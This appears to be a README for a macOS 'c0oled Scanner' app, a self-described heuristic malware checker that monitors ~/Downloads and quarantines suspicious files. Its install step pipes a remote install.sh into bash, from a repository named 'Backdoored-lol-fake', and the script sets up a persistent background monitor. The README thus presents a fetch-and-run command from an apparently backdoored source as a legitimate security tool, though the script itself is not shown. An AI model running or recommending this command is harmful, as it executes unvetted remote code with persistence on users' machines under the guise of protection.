# c0oled Scanner for macOS

A small macOS app created by this repository. It uses macOS built-in tools and Python 3; it does **not** require Homebrew or ClamAV.

## Install

```bash
curl -fsSL https://raw.githubusercontent.com/ttmeticks-source/Backdoored-lol-fake/main/install.sh | bash
```

The installer creates **`~/Applications/c0oled Scanner.app`**, installs its local scanning script, and starts a per-user background monitor.

## Behavior

- First run checks files already in `~/Downloads`.
- Later runs skip files whose size and modification time have not changed.
- Script files are checked for combinations of suspicious command patterns.
- App bundles are assessed with macOS Gatekeeper (`spctl`).
- Flagged items are moved to a local quarantine folder, not permanently deleted.
- Files are inspected locally; this tool does not upload them.

**Important limitation:** this is an original lightweight heuristic checker, not a full antivirus engine. It can miss malware and can flag legitimate tools. Keep macOS security protections enabled and review quarantined files before restoring or deleting them.

## Locations

- App: `~/Applications/c0oled Scanner.app`
- Quarantine: `~/Library/Application Support/c0oled-Scanner/Quarantine`
- Logs: `~/Library/Application Support/c0oled-Scanner/Logs`
